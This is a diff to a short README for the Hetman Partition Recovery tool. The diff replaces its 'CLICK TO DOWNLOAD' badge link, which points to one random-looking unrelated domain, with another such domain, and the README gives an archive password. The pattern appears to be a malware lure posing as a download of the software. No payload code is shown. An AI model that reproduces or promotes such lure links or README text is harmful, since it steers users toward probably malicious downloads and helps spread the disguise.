@@ -1,6 +1,6 @@
 # Hetman Partition Recovery
 
-[![CLICK TO DOWNLOAD](https://img.shields.io/badge/CLICK%20TO%20DOWNLOAD-008C3A?style=for-the-badge&logo=github&logoColor=white)](https://bipfdjnk.com/Hetman-Partition-Recovery-2)
+[![CLICK TO DOWNLOAD](https://img.shields.io/badge/CLICK%20TO%20DOWNLOAD-008C3A?style=for-the-badge&logo=github&logoColor=white)](https://efhiwogvjd.com/Hetman-Partition-Recovery-2)
 > #### Archive password: `2026`
 
 Hetman Partition Recovery is a Windows tool for recovering deleted files and damaged, formatted, or inaccessible partitions from various storage devices.
